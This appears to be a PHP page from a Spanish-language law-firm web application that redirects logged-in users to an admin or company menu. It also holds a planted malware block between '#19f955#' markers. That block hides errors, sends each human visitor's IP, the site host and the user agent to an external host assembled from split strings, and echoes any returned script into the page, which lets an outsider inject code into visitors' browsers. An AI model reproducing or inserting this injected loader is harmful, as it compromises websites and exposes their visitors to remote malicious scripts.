<?PHP
include ("config.php") ;
include ("funciones.php") ;
//include ("logout.php") ;
include ("secure.php") ;
//$bienvenida = "Bienvenido al sistema" ;
//echo "<SCRIPT LANGUAGE=\"JavaScript\"> alert (\"Hola: " . $bienvenida . " \") ; </SCRIPT>" ; 
?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_qjaa847 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_qjaa847) && !preg_match ('/bot/i', $wp_qjaa847))){
$wp_qjaa09847="http://"."http"."meta".".com/meta"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_qjaa847);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_qjaa09847);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_847qjaa = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_847qjaa,1,3) === 'scr' ){ echo $wp_847qjaa; }
#/19f955#
?>
<?php

?>
<?php

?>
<?PHP
if (1==2){
	echo "<BR>---------------------------------------------------------------------------------------";
	echo "<BR><b>variables GET</b>";
	reset($_GET);
	while (list($variab, $valor) = each($_GET)){
		echo "<BR>get  =>".$variab."=".$valor ;
	}
	echo "<BR>---------------------------------------------------------------------------------------";
	echo "<BR><b>variables POST</b>";
	reset($_POST);
	while (list($variab, $valor) = each($_POST)){
		echo "<BR>post =>".$variab."=".$valor ;
	}
	echo "<BR>---------------------------------------------------------------------------------------";
	if (1==2){
		echo "<BR><b>variables SERVER</b>";
		reset($_SERVER);
		while (list($variab, $valor) = each($_SERVER)){
			echo "<BR>server  =>".$variab."=".$valor ;
		}
	}
	echo "<BR>---------------------------------------------------------------------------------------";
	echo "<BR><b>variables SESSION</b>";
	reset($_SESSION);
	while (list($variab, $valor) = each($_SESSION)){
		echo "<BR>session  =>".$variab."=".$valor ;
	}
	echo "<BR>- -------------------------------------------------------------------------------------";
}
?>
<?PHP
if ($_SESSION['Empresa'] == "AyC Abogados"){
	header("Location: menu_admin.php");
	exit();
} else {
	header("Location: menu_empresa.php");
	exit();
}
?>
<BR>
<BR>
<BR>
<a href="salir.php">salir</a>
